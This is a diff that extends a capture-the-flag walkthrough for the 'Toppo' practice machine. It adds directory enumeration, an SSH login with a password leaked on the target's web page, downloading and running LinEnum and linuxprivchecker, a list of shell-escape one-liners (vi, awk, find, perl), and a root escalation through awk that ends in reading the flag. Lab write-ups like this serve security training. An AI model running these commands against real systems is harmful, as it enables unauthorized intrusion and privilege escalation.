@@ -55,6 +55,7 @@ OS and Service detection performed. Please report any incorrect results at https
 Nmap done: 1 IP address (1 host up) scanned in 16.83 seconds
 ```
 - [Zenmap output](zenmap_output.pdf)
+- Explore more webpages using `dirb` and `nikto`:
 ```
 $ dirb http://172.16.17.129/ /usr/share/dirb/wordlists/common.txt
 -----------------
@@ -134,6 +135,37 @@ $ nikto -h http://172.16.17.129/
 Note to myself :
 
 I need to change my password :/ 12345ted123 is too outdated but the technology isn't my thing i prefer go fishing or watching soccer .
+```
+- Access using user `ted` and password `12345ted123`:
+```
+ssh ted@172.16.17.129
+ted@172.16.17.129's password: 12345ted123
+```
+- See [LinEnum log](LinEnum.log) and [linuxprivchecker log](linuxprivchecker.log):
+```
+ted@Toppo:~$ wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+ted@Toppo:~$ chmod +x LinEnum.sh
+ted@Toppo:~$ ./LinEnum.sh
+wget https://raw.githubusercontent.com/sleventyeleven/linuxprivchecker/master/linuxprivchecker.py
+python linuxprivchecker.py
+# [+] Related Shell Escape Sequences...
+
+    vi-->	:!bash
+    vi-->	:set shell=/bin/bash:shell
+    awk-->	awk 'BEGIN {system("/bin/bash")}'
+    find-->	find / -exec /usr/bin/awk 'BEGIN {system("/bin/bash")}' \;
+perl--> perl -e 'exec "/bin/bash";'
+```
+- Privilege Escalation:
+```
+ted@Toppo:~$ awk 'BEGIN {system("/bin/sh")}'
+# id
+uid=1000(ted) gid=1000(ted) euid=0(root) groups=1000(ted),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),108(netdev),114(bluetooth)
+# cd /root
+# ls
+flag.txt
+# cat flag.txt	
+Congratulations ! there is your flag : 0wnedlab{p4ssi0n_c0me_with_pract1ce}
 ```
 
 
